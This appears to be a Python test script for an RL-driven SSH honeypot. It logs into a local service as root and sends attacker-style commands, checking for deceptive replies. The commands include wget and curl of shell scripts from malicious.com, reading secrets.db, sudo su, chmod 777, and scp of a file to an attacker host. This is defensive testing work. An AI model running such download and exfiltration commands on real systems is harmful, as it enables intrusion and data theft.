import pexpect
import sys
import time

def run_test(command, expected_substrings, test_name):
    print(f"\n[{test_name}] Testing '{command}'...")
    try:
        child = pexpect.spawn('ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -p 2222 root@127.0.0.1')
        index = child.expect(['password:', pexpect.EOF, pexpect.TIMEOUT], timeout=10)
        if index != 0:
            print("Failed to get password prompt")
            return

        child.sendline('root')
        child.expect(['#', '$'], timeout=10)
        
        child.sendline(command)
        
        # We need to capture output. Some commands might exit immediately (like our fake sudo), some might wait.
        # Our modified commands mostly exit immediately.
        # So we expect the prompt to return.
        
        idx = child.expect(['#', '$', pexpect.EOF], timeout=10)
        output = child.before.decode()
        print(f"Output:\n{output}")
        
        # Loose check for expected substrings (since we can't force action 0 vs 2 easily without mocking RL, 
        # but we can see what we get).
        # However, for Action 0 (Normal), which acts as the default if epsilon greedy chooses exploit (most likely 80%),
        # we should see the Normal output.
        # The user complained about Action 0 output specifically.
        
        found = False
        for es in expected_substrings:
            if es in output:
                found = True
                print(f"[MATCH] Found expected string: '{es}'")
                break
        
        if not found:
             print(f"[WARNING] Did not find any of the expected strings: {expected_substrings}")

        child.close()
        
    except Exception as e:
        print(f"Error: {e}")

def verify_responses():
    print("Starting verification of Aligned RL Responses...")
    
    tests = [
        ("cat secrets.db", ["Binary data output", "AWS_ACCESS_KEY", "root_password", "No such file"], "CAT"),
        ("wget http://malicious.com/shell.sh", ["Saving to: shell.sh", "backdoor.sh", "internal_backup.sh", "unable to resolve"], "WGET"),
        ("curl http://malicious.com/test.sh", ["Hello World", "reverse shell", "Production Server", "Could not resolve"], "CURL"),
        ("sudo su", ["[sudo] password", "unable to resolve", "root@server", "try again"], "SUDO"),
        ("chmod 777 shell.sh", ["Permission updated", "system binary modified", "Operation not permitted"], "CHMOD"),
        ("su", ["Password:", "Authentication failure", "root@server"], "SU"),
        ("scp file.txt attacker@1.2.3.4:/tmp", ["100%", "Transfer complete", "external transfer", "connection closed"], "SCP"),
        ("ssh attacker@192.168.1.10", ["Connecting to", "Connected to", "Security monitoring", "Connection refused"], "SSH")
    ]
    
    for cmd, expected, name in tests:
        run_test(cmd, expected, name)
        time.sleep(1)

    print("\nVerification Complete.")

if __name__ == "__main__":
    verify_responses()
